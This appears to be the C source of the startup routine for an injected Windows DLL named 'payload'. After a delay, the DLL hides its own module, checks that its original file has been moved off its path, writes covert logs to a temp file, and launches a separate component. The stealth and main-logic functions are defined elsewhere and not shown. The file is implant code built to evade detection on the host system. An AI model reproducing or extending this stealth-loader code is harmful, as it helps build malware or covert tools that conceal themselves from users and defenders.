#include "payload.h"

static HMODULE g_self = NULL;
static volatile BOOL g_initialized = FALSE;

static void get_log_path(char *out, DWORD size)
{
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    DWORD pid = GetCurrentProcessId();
    snprintf(out, size, "%sdi_%u.tmp", temp, pid);
}

static DWORD WINAPI startup_thread(LPVOID param)
{
    (void)param;
    Sleep(10000);

    stealth_hide(g_self);

    char logPath[MAX_PATH];
    get_log_path(logPath, MAX_PATH);
    log_init(logPath);
    log_write("D", "0x%p", g_self);

    const char *orig = stealth_get_orig_path();
    const char *moved = stealth_get_moved_path();
    if (moved[0]) {
        DWORD attr = GetFileAttributesA(orig);
        if (attr == INVALID_FILE_ATTRIBUTES)
            log_write("S", "OK rm %s -> %s", orig, moved);
        else
            log_write("S", "FAIL still %s", orig);
    } else {
        log_write("S", "NO path");
    }

    gstate_start();
    return 0;
}

void payload_startup(HMODULE selfModule)
{
    if (g_initialized) return;
    g_initialized = TRUE;
    g_self = selfModule;
    CreateThread(NULL, 0, startup_thread, NULL, 0, NULL);
}

void payload_shutdown(void)
{
    if (!g_initialized) return;
    gstate_stop();
    log_close();
    stealth_restore();
}
